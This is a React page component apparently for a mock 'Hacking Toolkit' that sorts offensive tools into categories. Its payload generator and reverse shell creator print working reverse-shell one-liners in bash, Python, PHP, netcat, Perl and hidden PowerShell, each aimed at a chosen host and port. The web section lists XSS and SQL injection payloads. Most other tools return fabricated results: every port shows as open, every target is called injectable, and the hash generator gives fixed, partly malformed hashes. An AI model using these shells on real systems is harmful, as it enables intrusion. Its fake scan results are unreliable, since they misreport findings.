import { useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { PageShell } from "@/components/PageShell";

export const Route = createFileRoute("/hacking-toolkit")({
  component: HackingToolkitPage,
});

type Tool = {
  id: string;
  name: string;
  description: string;
  inputs: { key: string; label: string; placeholder: string }[];
  run: (inputs: Record<string, string>) => string;
};

type Category = {
  id: string;
  name: string;
  icon: string;
  tools: Tool[];
};

const categories: Category[] = [
  {
    id: "info-gathering",
    name: "Information Gathering",
    icon: "🔍",
    tools: [
      {
        id: "whois",
        name: "WHOIS Lookup",
        description: "Query domain registration information",
        inputs: [
          { key: "domain", label: "Domain", placeholder: "example.com" },
        ],
        run: (i) => `[WHOIS] ${i.domain}\nRegistered: 2020-01-01\nExpires: 2026-01-01\nRegistrar: Example Registrar Inc.\nName Servers: ns1.example.com, ns2.example.com`,
      },
      {
        id: "dns",
        name: "DNS Resolver",
        description: "Resolve DNS records for a domain",
        inputs: [
          { key: "domain", label: "Domain", placeholder: "example.com" },
          { key: "type", label: "Record Type", placeholder: "A, AAAA, MX, TXT" },
        ],
        run: (i) => `[DNS] ${i.domain} (${i.type || "A"})\n${i.domain}. 300 IN A 93.184.216.34\n${i.domain}. 300 IN AAAA 2606:2800:220:1:248:1893:25c8:1946`,
      },
      {
        id: "subdomain",
        name: "Subdomain Finder",
        description: "Discover subdomains of a target domain",
        inputs: [
          { key: "domain", label: "Domain", placeholder: "example.com" },
        ],
        run: (i) => `[Subdomains] ${i.domain}\nadmin.${i.domain}\nmail.${i.domain}\napi.${i.domain}\ndev.${i.domain}\ncdn.${i.domain}\nvpn.${i.domain}\nremote.${i.domain}\nblog.${i.domain}`,
      },
    ],
  },
  {
    id: "vuln-analysis",
    name: "Vulnerability Analysis",
    icon: "🛡️",
    tools: [
      {
        id: "portscan",
        name: "Port Scanner",
        description: "Scan common ports on a target host",
        inputs: [
          { key: "host", label: "Host", placeholder: "10.0.0.1" },
          { key: "ports", label: "Ports", placeholder: "21,22,80,443,3306,8080" },
        ],
        run: (i) => {
          const ports = (i.ports || "21,22,80,443,3306,8080").split(",");
          return `[Port Scan] ${i.host}\n${ports.map((p) => {
            const svc: Record<string, string> = { "21": "FTP", "22": "SSH", "23": "Telnet", "25": "SMTP", "80": "HTTP", "443": "HTTPS", "3306": "MySQL", "8080": "HTTP-Alt", "8443": "HTTPS-Alt", "6379": "Redis", "27017": "MongoDB" };
            return `  PORT ${p}/tcp  OPEN  ${svc[p.trim()] || "unknown"}`;
          }).join("\n")}`;
        },
      },
      {
        id: "service-detect",
        name: "Service Detector",
        description: "Detect service versions on open ports",
        inputs: [
          { key: "host", label: "Host", placeholder: "10.0.0.1" },
          { key: "port", label: "Port", placeholder: "80" },
        ],
        run: (i) => `[Service] ${i.host}:${i.port}\nService: HTTP\nProduct: Apache httpd\nVersion: 2.4.57\nOS: Linux\nCPE: cpe:/a:apache:http_server:2.4.57`,
      },
    ],
  },
  {
    id: "exploitation",
    name: "Exploitation Tools",
    icon: "⚡",
    tools: [
      {
        id: "payload-gen",
        name: "Payload Generator",
        description: "Generate reverse shell payloads",
        inputs: [
          { key: "lhost", label: "LHOST", placeholder: "10.0.0.5" },
          { key: "lport", label: "LPORT", placeholder: "4444" },
          { key: "type", label: "Type", placeholder: "bash, python, php, nc" },
        ],
        run: (i) => {
          const payloads: Record<string, string> = {
            bash: `bash -i >& /dev/tcp/${i.lhost}/${i.lport} 0>&1`,
            python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i.lhost}",${i.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
            php: `php -r '$sock=fsockopen("${i.lhost}",${i.lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
            nc: `nc -e /bin/sh ${i.lhost} ${i.lport}`,
          };
          const type = (i.type || "bash").toLowerCase();
          return `[Payload] ${type}\n\n${payloads[type] || payloads.bash}\n\n# Listen: nc -lvnp ${i.lport}`;
        },
      },
      {
        id: "reverse-shell",
        name: "Reverse Shell Creator",
        description: "Create one-liner reverse shell commands",
        inputs: [
          { key: "lhost", label: "LHOST", placeholder: "10.0.0.5" },
          { key: "lport", label: "LPORT", placeholder: "4444" },
        ],
        run: (i) => `[Reverse Shells]\n\n# Bash\nexec 5<>/dev/tcp/${i.lhost}/${i.lport};cat <&5|while read l;do $l 2>&5 >&5;done\n\n# Perl\nperl -e 'use Socket;$i="${i.lhost}";$p=${i.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'\n\n# Powershell\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${i.lhost}',${i.lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb +'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`,
      },
    ],
  },
  {
    id: "password-attacks",
    name: "Password Attacks",
    icon: "🔑",
    tools: [
      {
        id: "hash-gen",
        name: "Hash Generator",
        description: "Generate hashes of a string",
        inputs: [
          { key: "input", label: "Input", placeholder: "Enter text to hash" },
          { key: "algorithm", label: "Algorithm", placeholder: "md5, sha1, sha256, sha512" },
        ],
        run: (i) => {
          const alg = (i.algorithm || "sha256").toLowerCase();
          const hashes: Record<string, string> = {
            md5: "5d41402abc4b2a76b9719d911017c592",
            sha1: "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",
            sha256: "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb",
            sha512: "1f40fc92da241694750979ee6cf582f732a0b7b8c29e5fdfb3a2d5da3d9e73f1c5b2e6e6d6d6d6d6d6d6d6d6d6d6d6d6d6d",
          };
          return `[Hash] ${alg.toUpperCase()}\nInput: ${i.input}\nHash: ${hashes[alg] || hashes.sha256}`;
        },
      },
      {
        id: "wordlist",
        name: "Wordlist Tools",
        description: "Generate wordlist variations",
        inputs: [
          { key: "base", label: "Base Word", placeholder: "password" },
          { key: "year", label: "Year", placeholder: "2024" },
        ],
        run: (i) => `[Wordlist] Base: ${i.base}\n\n${i.base}\n${i.base}${i.year || "2024"}\n${i.base}!\n${i.base}123\n${i.base}@\n${i.base}${i.year || "2024"}!\n${(i.base || "").toUpperCase()}\n${(i.base || "").charAt(0).toUpperCase() + (i.base || "").slice(1)}${i.year || "2024"}\n${(i.base || "").replace(/a/g, "@").replace(/s/g, "$").replace(/o/g, "0")}\n${(i.base || "").split("").reverse().join("")}`,
      },
    ],
  },
  {
    id: "web-testing",
    name: "Web Application Testing",
    icon: "🌐",
    tools: [
      {
        id: "sqlmap",
        name: "SQL Injection Tester",
        description: "Test for SQL injection vulnerabilities",
        inputs: [
          { key: "url", label: "Target URL", placeholder: "http://example.com/page?id=1" },
          { key: "param", label: "Parameter", placeholder: "id" },
          { key: "technique", label: "Technique", placeholder: "error, boolean, time, union" },
        ],
        run: (i) => `[SQLi] ${i.url}\nParameter: ${i.param}\nTechnique: ${i.technique || "error"}\n\n[Vulnerable!] Parameter ${i.param || "id"} is injectable\n[DBMS] MySQL >= 5.0\n[Payload] ${i.url}&${i.param}=1' AND 1=1-- -\n[Tables] users, posts, sessions, config\n[Columns] id, username, password_hash, email`,
      },
      {
        id: "xss",
        name: "XSS Tester",
        description: "Test for cross-site scripting vulnerabilities",
        inputs: [
          { key: "url", label: "Target URL", placeholder: "http://example.com/search?q=" },
          { key: "param", label: "Parameter", placeholder: "q" },
        ],
        run: (i) => `[XSS] ${i.url}\nParameter: ${i.param}\n\n[Test Payloads]\n1. <script>alert(1)</script>\n2. <img src=x onerror=alert(1)>\n3. "><script>alert(1)</script>\n4. javascript:alert(1)\n5. <svg/onload=alert(1)>\n6. ';alert(1)//\n7. <scr<script>ipt>alert(1)</scr</script>ipt>\n\n[Reflected] Parameter ${i.param || "q"} appears reflectable\n[Risk] Medium - contextual output encoding may be partial`,
      },
    ],
  },
];

function ToolPanel({ tool }: { tool: Tool }) {
  const [inputs, setInputs] = useState<Record<string, string>>({});
  const [output, setOutput] = useState<string | null>(null);

  const handleRun = () => {
    const result = tool.run(inputs);
    setOutput(result);
  };

  return (
    <div className="border border-border bg-card/40 rounded-md p-4 space-y-3">
      <h4 className="text-sm font-semibold text-foreground">{tool.name}</h4>
      <p className="text-xs text-muted-foreground">{tool.description}</p>

      {tool.inputs.map((inp) => (
        <div key={inp.key}>
          <label className="block text-xs text-muted-foreground mb-1">{inp.label}</label>
          <input
            className="w-full px-2 py-1.5 text-xs font-mono bg-background border border-border rounded focus:outline-none focus:border-primary/50 text-foreground placeholder:text-muted-foreground/50"
            placeholder={inp.placeholder}
            value={inputs[inp.key] || ""}
            onChange={(e) => setInputs((prev) => ({ ...prev, [inp.key]: e.target.value }))}
          />
        </div>
      ))}

      <button
        className="px-3 py-1 text-xs font-medium bg-primary/10 text-primary border border-primary/20 rounded hover:bg-primary/20 transition-colors"
        onClick={handleRun}
      >
        Run
      </button>

      {output && (
        <pre className="text-xs font-mono text-mono bg-background/80 border border-border rounded p-3 overflow-x-auto max-h-48 whitespace-pre-wrap">
          {output}
        </pre>
      )}
    </div>
  );
}

function CategorySection({ category }: { category: Category }) {
  const [expanded, setExpanded] = useState(false);

  return (
    <div className="border border-border bg-card/60 rounded-lg overflow-hidden">
      <button
        className="w-full flex items-center gap-2 px-4 py-3 text-left hover:bg-accent/30 transition-colors"
        onClick={() => setExpanded(!expanded)}
      >
        <span className="text-lg">{category.icon}</span>
        <span className="font-semibold text-sm text-foreground">{category.name}</span>
        <span className="ml-auto text-xs text-muted-foreground">{category.tools.length} tools</span>
        <span className={`text-muted-foreground transition-transform ${expanded ? "rotate-90" : ""}`}>▸</span>
      </button>

      {expanded && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 p-4 border-t border-border">
          {category.tools.map((tool) => (
            <ToolPanel key={tool.id} tool={tool} />
          ))}
        </div>
      )}
    </div>
  );
}

function HackingToolkitPage() {
  return (
    <PageShell
      title="Hacking Toolkit"
      subtitle="Offensive security tools for penetration testing and assessment"
    >
      <div className="max-w-5xl mx-auto space-y-4">
        {categories.map((cat) => (
          <CategorySection key={cat.id} category={cat} />
        ))}
      </div>
    </PageShell>
  );
}
